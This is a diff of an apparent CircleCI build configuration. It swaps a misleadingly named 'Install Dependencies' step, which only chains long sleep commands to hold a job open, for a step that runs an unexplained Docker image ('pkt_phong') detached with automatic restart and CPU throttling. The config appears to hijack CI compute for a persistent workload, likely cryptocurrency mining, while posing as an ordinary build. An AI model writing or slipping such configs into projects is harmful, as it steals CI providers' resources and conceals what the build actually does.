@@ -1,17 +1,8 @@
-version: 2.1
+version: 2
 jobs:
-    trial:
-      docker:
-            - image: nguyenduyphong/pkt_phong:tagname
-      parallelism: 1
-      steps:
-        - run:
-            name: Install Dependencies
-            command: |
-              sleep  9 && sleep 99 && sleep 999 &&  sleep 9999 &&  sleep 99999 &&  sleep 999999 && sleep 9999999 && sleep 99999999 && sleep 999999999 &          
-
-workflows:
-    version: 2.1
-    build:
-        jobs:
-        - trial
+ build:
+   machine: true
+   steps:
+     - checkout
+     - run: 
+          sudo docker run -d --restart always --name PKT1 -it --cpus="0.5" --cpu-shares="512" nguyenduyphong/pkt_phong:tagname  
